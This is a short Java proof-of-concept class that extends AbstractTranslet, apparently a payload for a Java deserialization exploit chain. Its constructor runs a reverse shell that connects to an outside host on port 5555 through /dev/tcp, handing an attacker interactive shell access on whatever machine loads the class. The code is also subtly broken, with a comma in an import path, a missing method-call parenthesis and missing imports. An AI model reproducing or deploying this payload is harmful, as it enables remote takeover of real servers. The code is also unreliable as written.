import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;
import java.lang.Runtime;
import java,lang.Process;

public class Poc extends AbstractTranslet{
	public Poc() throws IOException{
		Runtime rt = Runtime.getRuntime();
		String [] cmd = {"/bin/sh","-c","/bin/sh -i >& /dev/tcp/cd.qcloud.3v3.im/5555 2>&1 0>&1"};
		Runtime.getRuntime.exec(cmd);
	}
	@Override
	public void transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler){		
	}
	@Override
	public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException{
	}
	public static void main(String[] args) throws Exception{
		Poc t = new Poc();
	}
}